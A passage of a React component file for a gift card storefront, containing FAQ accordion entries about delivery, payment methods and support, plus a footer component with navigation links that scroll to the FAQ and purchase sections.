                            <AccordionIcon />
                        </AccordionButton>
                    </h2>
                    <AccordionPanel pb={4}>
                        Upon completion of your order, your Gift Card will be promptly delivered digitally via web email. In certain cases, as a precaution against payment fraud, we might request verification of your payment details by uploading an identification card. Please be aware that this is a one-time request and will significantly expedite future orders. Our standard processing time for a Gift Card is typically 1-3 minutes.
                    </AccordionPanel>
                </AccordionItem>
                <AccordionItem>
                    <h2>
                        <AccordionButton>
                            <Box as='span' flex='1' textAlign='left'>
                                What payment methods can i use to buy digital card?
                            </Box>
                            <AccordionIcon />
                        </AccordionButton>
                    </h2>
                    <AccordionPanel pb={4}>
                        FastGiftie offers a secure platform for purchasing Gift Cards online from any location worldwide. We provide a variety of payment methods to suit your convenience, including credit cards, debit cards, Cash App, Venmo, and even cryptocurrency options such as Bitcoin (BTC) and Ethereum (ETH).
                    </AccordionPanel>
                </AccordionItem>
                <AccordionItem>
                    <h2>
                        <AccordionButton>
                            <Box as='span' flex='1' textAlign='left'>
                                How can i get a digital card to a friend?
                            </Box>
                            <AccordionIcon />
                        </AccordionButton>
                    </h2>
                    <AccordionPanel pb={4}>
                        Sending a Gift Card to a friend, instantly or scheduling for a specific delivery in the future, is fast and easy. You can do this by sliding the 'send as gift' switch on the purchase a card page
                    </AccordionPanel>
                </AccordionItem>
                <AccordionItem>
                    <h2>
                        <AccordionButton>
                            <Box as='span' flex='1' textAlign='left'>
                                What if i need instant support?
                            </Box>
                            <AccordionIcon />
                        </AccordionButton>
                    </h2>
                    <AccordionPanel pb={4}>
                        You can open a support ticket using our customer support live chat and we will respond to your request right away. If you are an existing customer, please provide youn order number or email address associated with your order to help us assist you faster
                    </AccordionPanel>
                </AccordionItem>
                <AccordionItem>
                    <h2>
                        <AccordionButton>
                            <Box as='span' flex='1' textAlign='left'>
                                What if i have an issue redeeming my digital Gift Card
                            </Box>
                            <AccordionIcon />
                        </AccordionButton>
                    </h2>
                    <AccordionPanel pb={4}>
                        If in the case there is an issue and you are receiving an error when you try to redeem, please open an online support ticket and include your order number along with a screenshot so we can see the exact error message
                    </AccordionPanel>
                </AccordionItem>
            </Accordion>
    </Box>
));

const InformationSection = ({ faqRef, purchaseOrValidateRef }) => {
    const scrollToFAQ = () => {
        faqRef.current.scrollIntoView({ behavior: 'smooth' });
    };

    const scrollToPurchaseOrValidate = () => {
        purchaseOrValidateRef.current.scrollIntoView({ behavior: 'smooth' });
    };

    return (
        <Box minHeight="30vh" width="100%" p={20} mx="auto" mt={20} bg={`black`} color={`white`}>
            <SimpleGrid columns={{ base: 1, md: 4 }} spacing={10}>
                <Box gridColumn={{ base: "span 1", md: "span 2" }}>
                    <Text fontSize="sm" mb={4}>
                        Purchase digital cards with instant email delivery. We email all kinds of cards internationally. We accept PayPal and credit cards mode of payment. We are available 24/7.
                    </Text>
                    <VStack align="start" spacing={4}>
                        <Input placeholder="Enter your email" />
                        <Button variant='solid'>Submit</Button>
                    </VStack>
                </Box>
                <VStack spacing={4} align="stretch">
                    <Text fontSize="lg" fontWeight="bold">Explore</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }}>About</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }}>Contact</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }} onClick={scrollToFAQ}>FAQ's</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }}>Privacy Policy</Text>
                </VStack>
                <VStack spacing={4} align="stretch">
                    <Text fontSize="lg" fontWeight="bold">Actions</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }} onClick={scrollToPurchaseOrValidate}>Buy Card</Text>
                    <Text cursor="pointer" _hover={{ color: "blue.500" }} onClick={scrollToPurchaseOrValidate}>Validate Card</Text>
                </VStack>
            </SimpleGrid>
            <Box width="100%" mt={10} py={4} textAlign="center">
            <Divider mb={4} />
            <Flex justify="space-between" px={4}>
                <Text>© 2023 Active Gift Card Validator</Text>
                <Text>All rights reserved.</Text>
            </Flex>
        </Box>
        </Box>
    );
};


